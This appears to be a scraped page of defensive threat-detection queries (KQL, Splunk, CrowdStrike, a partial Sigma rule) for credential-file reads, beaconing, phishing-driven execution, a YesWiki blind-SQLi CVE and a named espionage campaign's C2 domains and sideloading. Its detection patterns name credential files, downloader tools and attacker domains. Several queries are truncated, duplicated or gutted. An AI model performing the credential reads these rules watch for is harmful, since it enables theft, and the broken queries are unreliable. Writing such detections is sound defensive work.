    ProcessCommandLine has "/proc/1/environ","pid1_env",
    ProcessCommandLine has "/.ssh/id_","ssh_key",
    ProcessCommandLine has "/.kube/config","kube",
    ProcessCommandLine has "/.npmrc","npm",
    ProcessCommandLine has "/.docker/config.json","docker",
    "")
| summarize
    DistinctTargets = dcount(Target),
    Targets = make_set(Target, 10),
    SampleCmds = make_set(ProcessCommandLine, 10),
    FirstSeen = min(Timestamp),
    LastSeen = max(Timestamp)
    by DeviceName, AccountName, InitiatingProcessId, InitiatingProcessFileName, InitiatingProcessCommandLine, bin(Timestamp, WindowMin)
| where DistinctTargets >= 3
| order by LastSeen desc
let LookbackDays = 7d;
let WindowMin = 1m;
ImProcessCreate
| where TimeGenerated > ago(LookbackDays)
| where ActingProcessName endswith "cat"
| where ActingProcessCommandLine has_any ("/proc/1/environ","/.ssh/id_","/.kube/config","/.npmrc","/.docker/config.json")
| extend Target = case(
    ActingProcessCommandLine has "/proc/1/environ","pid1_env",
    ActingProcessCommandLine has "/.ssh/id_","ssh_key",
    ActingProcessCommandLine has "/.kube/config","kube",
    ActingProcessCommandLine has "/.npmrc","npm",
    ActingProcessCommandLine has "/.docker/config.json","docker",
    "")
| summarize
    DistinctTargets = dcount(Target),
    Targets = make_set(Target, 10),
    SampleCmds = make_set(ActingProcessCommandLine, 10),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated)
    by DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, bin(TimeGenerated, WindowMin)
| where DistinctTargets >= 3
| order by LastSeen desc
source:linux.auditd @process.executable.path:*\/cat @process.command_line:(*\/proc\/1\/environ* OR *\/.ssh\/id_* OR *\/.kube\/config* OR *\/.npmrc* OR *\/.docker\/config.json*)
#event_simpleName=ProcessRollup2 ImageFileName=/\/cat$/i CommandLine=/(\/proc\/1\/environ|\/\.ssh\/id_|\/\.kube\/config|\/\.npmrc|\/\.docker\/config\.json)/
| case {
    CommandLine=/\/proc\/1\/environ/ | target := "pid1";
    CommandLine=/\/\.ssh\/id_/ | target := "ssh";
    CommandLine=/\/\.kube\/config/ | target := "kube";
    CommandLine=/\/\.npmrc/ | target := "npm";
    CommandLine=/\/\.docker\/config\.json/ | target := "docker";
  }
| groupBy([aid, ComputerName, UserName, ParentBaseFileName], function=[count(field=target, distinct=true, as=distinct_targets), collect([target])])
| distinct_targets >= 3
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmds from datamodel=Endpoint.Processes where Processes.process_name=cat (Processes.process="*/proc/1/environ*" OR Processes.process="*/.ssh/id_*" OR Processes.process="*/.kube/config*" OR Processes.process="*/.npmrc*" OR Processes.process="*/.docker/config.json*") by Processes.dest Processes.user Processes.parent_process_id Processes.parent_process_name _time span=1m | `drop_dm_object_name(Processes)` | eval is_ssh=if(match(mvjoin(cmds,"|"),"/.ssh/id_"),1,0), is_kube=if(match(mvjoin(cmds,"|"),"/.kube/config"),1,0), is_npm=if(match(mvjoin(cmds,"|"),"/.npmrc"),1,0), is_proc=if(match(mvjoin(cmds,"|"),"/proc/1/environ"),1,0), is_docker=if(match(mvjoin(cmds,"|"),"/.docker/config.json"),1,0) | eval distinct_targets=is_ssh+is_kube+is_npm+is_proc+is_docker | where distinct_targets>=3 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmds from datamodel=Endpoint.Processes where Processes.process_name=cat (Processes.process="*/proc/1/environ*" OR Processes.process="*/.ssh/id_*" OR Processes.process="*/.kube/config*" OR Processes.process="*/.npmrc*" OR Processes.process="*/.docker/config.json*") by Processes.dest Processes.user Processes.parent_process_id Processes.parent_process_name _time span=1m | `drop_dm_object_name(Processes)` | eval is_ssh=if(match(mvjoin(cmds,"|"),"/.ssh/id_"),1,0), is_kube=if(match(mvjoin(cmds,"|"),"/.kube/config"),1,0), is_npm=if(match(mvjoin(cmds,"|"),"/.npmrc"),1,0), is_proc=if(match(mvjoin(cmds,"|"),"/proc/1/environ"),1,0), is_docker=if(match(mvjoin(cmds,"|"),"/.docker/config.json"),1,0) | eval distinct_targets=is_ssh+is_kube+is_npm+is_proc+is_docker | where distinct_targets>=3 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038") or SHA1 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038") or MD5 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038") or SHA1 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038") or MD5 in~ ("acac5a9854650c4ae2883c4740bf87d34120c038")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["acac5a9854650c4ae2883c4740bf87d34120c038"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Actions on Objectives
—
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"

[LLM] YesWiki Bazar form-import volumetric POST — CVE-2026-46670 blind SQLi extraction loop Exploitation High
Hunts the byte-by-byte extraction loop used to exploit CVE-2026-46670 in YesWiki. The PoC drives one POST to /?BazaR&vue=formulaire per character of the hex-encoded value being exfiltrated from yeswiki_users, producing dozens-to-hundreds of POSTs to a single URI from a single source IP in a short window — an unusual pattern for a wiki application. Rationale: Locks on the article's exact request shape (POST + csUriQuery containing both 'BazaR' and 'vue=formulaire') and the unavoidable property of the PoC: blind extraction requires N requests for N characters of the password hash, so a per-source-IP POST count >=20 in 5 min to this single endpoint is a strong signal that something other than a human is wiki-ing. Cross-checked against: • https://github.com/advisories/GHSA-jwvv-qr7q-cv8j • https://github.com/YesWiki/yeswiki/blob/1f485c049db030b94c047ec219e63534ac81142e/tools/bazar/services/FormManager.php#L258
ATT&CKT1190 T1078
Data sourcesWeb
let WindowMinutes = 5m;
let PostThreshold = 20;
W3CIISLog
| where TimeGenerated > ago(7d)
| where csMethod =~ "POST"
| where csUriQuery has "BazaR" and csUriQuery has "vue=formulaire"
| summarize Posts = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), UserAgents = make_set(csUserAgent, 5), Statuses = make_set(scStatus, 5), Stems = make_set(csUriStem, 3)
          by cIP, sSiteName, bin(TimeGenerated, WindowMinutes)
| where Posts >= PostThreshold
| order by LastSeen desc
WEB
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count from datamodel=Web where Web.http_method="POST" Web.url="*BazaR*vue=formulaire*" by Web.src, Web.dest, Web.url, Web.http_user_agent, _time span=5m | `drop_dm_object_name(Web)` | where count >= 20 | sort 0 - count
| tstats summariesonly=false count from datamodel=Web where Web.http_method="POST" Web.url="*BazaR*vue=formulaire*" by Web.src, Web.dest, Web.url, Web.http_user_agent, _time span=5m | `drop_dm_object_name(Web)` | where count >= 20 | sort 0 - count
[LLM] Non-browser User-Agent against YesWiki Bazar form-import endpoint — CVE-2026-46670 exploit tooling Exploitation High
Hunts the PoC's exploit fingerprint: a request to /?BazaR&vue=formulaire from a scripting-language User-Agent (the published PoC uses Python-urllib/3.13). Real users post Bazar forms from a browser; a curl/python/PowerShell UA on this exact endpoint is high-signal for CVE-2026-46670 exploitation or reconnaissance. Rationale: The published PoC literally ships with User-Agent: Python-urllib/3.13 (from the Burp capture in the article body). The Bazar form-import endpoint is a low-traffic admin path on YesWiki; a scripting-language UA hitting it via POST is rarely benign and matches both the public PoC and copycat exploitation. Cross-checked against the GHSA advisory at github.com/advisories/GHSA-jwvv-qr7q-cv8j. Cross-checked against: • https://github.com/advisories/GHSA-jwvv-qr7q-cv8j

[LLM] MiniUpdate UpdateChecker.dll sideload via legitimate signed .NET host Installation High
Detects loading of the Screening Serpens MiniUpdate payload (internal name UpdateChecker.dll) by a legitimate signed .NET host process via DLL sideloading. The DLL is dropped alongside a hijack-vulnerable benign binary from the Hiring Portal.zip lure and loaded from non-standard user-writable directories. Rationale: Pivots on Unit 42's named internal DLL `UpdateChecker.dll` plus the eight published SHA256 hashes for the MiniUpdate RAT family. User-writable path filter mirrors Screening Serpens' Hiring Portal.zip ZIP-extract sideload chain. Cross-checked against Check Point's 2025 UNC1549 report and MITRE T1574.014 (AppDomainManager Injection). Cross-checked against: • https://attack.mitre.org/groups/G1019/ • https://research.checkpoint.com/2025/iranian-cyber-actors-target-europe/ • https://attack.mitre.org/techniques/T1574/014/
ATT&CKT1574.002 T1574.014

[LLM] Screening Serpens AppDomainManager hijack via .NET app .config tampering Installation High
Detects writes of a .NET application configuration file (appname.exe.config) containing an `appDomainManagerAssembly` / `appDomainManagerType` entry that redirects CLR initialization to a sideloaded assembly. This is the core Screening Serpens 2026 evolution that disables target app security and loads MiniUpdate/MiniJunk V2 RATs. Rationale: Targets the specific Unit 42-described evolution: AppDomainManager hijacking that manipulates .NET initialization via a legitimate .config file. The pattern of a same-directory triple (legitimate signed EXE + attacker EXE.config + attacker DLL) in user-writable paths is highly specific to this campaign and rarely seen in legitimate software, which always installs to Program Files via MSI/trusted installers. Cross-checked against: • https://attack.mitre.org/techniques/T1574/014/ • https://pentestlab.blog/2020/05/20/persistence-appdomainmanager/ • https://research.checkpoint.com/2025/iranian-cyber-actors-target-europe/
ATT&CKT1574.014 T1574.002
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName endswith ".exe.config"
| where FolderPath has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\", @"\ProgramData\")
| where InitiatingProcessFileName !in~ ("msiexec.exe","TrustedInstaller.exe","wusa.exe","setup.exe","installer.exe","OfficeClickToRun.exe","GoogleUpdate.exe")
| where InitiatingProcessFolderPath !startswith @"C:\Program Files"
| where InitiatingProcessFolderPath !startswith @"C:\Program Files (x86)"
| join kind=inner (
    DeviceFileEvents
    | where Timestamp > ago(30d)
    | where FileName endswith ".dll"
    | where FolderPath has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\", @"\ProgramData\")
    | project DllTime=Timestamp, DeviceId, DllFolder=FolderPath, DllName=FileName, DllSHA256=SHA256, DllWriter=InitiatingProcessFileName
) on DeviceId
| where abs(datetime_diff('second', Timestamp, DllTime)) < 300 and tolower(FolderPath) == tolower(DllFolder)
| project Timestamp, DeviceName, InitiatingProcessAccountName, ConfigPath=FolderPath, ConfigName=FileName, DllName, DllSHA256, DllWriter, InitiatingProcessCommandLine
let configWrites = ImFileEvent

| where TargetFileName endswith ".exe.config"
| where TargetFilePath has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\", @"\ProgramData\")
| where ActingProcessName !in~ ("msiexec.exe","TrustedInstaller.exe","wusa.exe","setup.exe","OfficeClickToRun.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ConfigPath=TargetFilePath, ConfigName=TargetFileName, ActingProcessName, ActingProcessCommandLine;
let dllWrites = ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName endswith ".dll"
| where TargetFilePath has_any (@"\Users\", @"\AppData\", @"\Temp\", @"\Downloads\", @"\ProgramData\")
| project DllTime=TimeGenerated, DvcHostname, DllPath=TargetFilePath, DllName=TargetFileName, DllSHA256=TargetFileSHA256;

[LLM] Screening Serpens C2 — DNS/network to UNC1549 infrastructure (Feb-Apr 2026) Command & Control High
Detects any DNS resolution or network connection to the four Unit 42-published Screening Serpens C2 domains used during the Feb-Apr 2026 espionage campaign against US, Israel, UAE and Middle Eastern targets. These domains are dedicated per-target/per-variant and seeing any single resolution is high-fidelity. Rationale: All four domains are explicitly named in the Unit 42 article as Screening Serpens C2 infrastructure for the Feb-Apr 2026 MiniUpdate/MiniJunk V2 campaign. The note `buisness-centeral-transportation.com` (deliberate typosquat of `business-central-transportation`) and `ramiltonsfinance.com` are highly unusual lures unlikely to appear in benign traffic. Cross-checked against MITRE G1019 (UNC1549) and Check Point's earlier Western Europe expansion report. Cross-checked against: • https://attack.mitre.org/groups/G1019/ • https://research.checkpoint.com/2025/iranian-cyber-actors-target-europe/
ATT&CKT1071.001 T1071.004 T1583.001
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic Web.Web
let c2Domains = dynamic(["business-startup.org","buisness-centeral-transportation.com","premierhealthadvisory.com","ramiltonsfinance.com"]);
DeviceNetworkEvents
| where Timestamp > ago(90d)
| where RemoteUrl has_any (c2Domains) or RemoteUrl endswith ".business-startup.org" or RemoteUrl endswith ".buisness-centeral-transportation.com" or RemoteUrl endswith ".premierhealthadvisory.com" or RemoteUrl endswith ".ramiltonsfinance.com"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RemoteUrl, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
let c2Domains = dynamic(["business-startup.org","buisness-centeral-transportation.com","premierhealthadvisory.com","ramiltonsfinance.com"]);
union isfuzzy=true
(DnsEvents
| where TimeGenerated > ago(90d)
| where Name has_any (c2Domains)
| project TimeGenerated, Source="DnsEvents", Host=Computer, SrcIp=ClientIP, Query=Name, RemoteIp=tostring(IPAddresses)),
(ImDnsActivity
| where TimeGenerated > ago(90d)
| where DnsQuery has_any (c2Domains)
| project TimeGenerated, Source="ImDnsActivity", Host=SrcHostname, SrcIp=SrcIpAddr, Query=DnsQuery, RemoteIp=tostring(DnsResponseName)),
(CommonSecurityLog
| where TimeGenerated > ago(90d)
| where DestinationHostName has_any (c2Domains) or DestinationDnsDomain has_any (c2Domains) or RequestURL has_any (c2Domains)
| project TimeGenerated, Source="CommonSecurityLog", Host=SourceHostName, SrcIp=SourceIP, Query=coalesce(DestinationHostName, DestinationDnsDomain, RequestURL), RemoteIp=DestinationIP),
(ImWebSession
| where TimeGenerated > ago(90d)
| where Url has_any (c2Domains) or HttpHostName has_any (c2Domains)
| project TimeGenerated, Source="ImWebSession", Host=SrcHostname, SrcIp=SrcIpAddr, Query=coalesce(HttpHostName, Url), RemoteIp=DstIpAddr)
| order by TimeGenerated desc

[LLM] Screening Serpens recruitment lure — Hiring Portal.zip + job requisition PDFs Delivery High
Detects delivery of the Screening Serpens spear-phishing lure: an archive named Hiring Portal.zip (or nested within an outer ZIP) accompanied by job-requisition PDFs following the pattern '*Software Engineer*Job ID JR######*.pdf'. Targets technical personnel in aerospace, defense and telecom sectors. Rationale: Pivots on the specific lure filename `Hiring Portal.zip` named by Unit 42 (and previously by Check Point research as a Screening Serpens artifact), plus the documented job-requisition PDF pattern (e.g., `Senior Software Engineer Job ID JR205894.pdf`). Restricting to user-download locations cuts the FP rate from generic HR keyword matches on email gateways. Cross-checked against: • https://research.checkpoint.com/2025/iranian-cyber-actors-target-europe/ • https://attack.mitre.org/groups/G1019/
ATT&CKT1566.001 T1204.002 T1036.005

| where Timestamp > ago(60d)
| where FileName in~ (lureFileNames) or FileName matches regex @"(?i)^.*Software Engineer.*Job ID JR\d{6}.*\.pdf$" or FileName matches regex @"(?i)^.*Senior.*Engineer.*Job ID JR\d{6}.*\.pdf$"
| join kind=leftouter (EmailEvents | project NetworkMessageId, SenderFromAddress, SenderFromDomain, RecipientEmailAddress, Subject, DeliveryAction, DeliveryLocation) on NetworkMessageId

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/

author: Clankerusecase
date: 2026/05/02

detection:

            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'

    selection_file:

level: high

    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"

      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
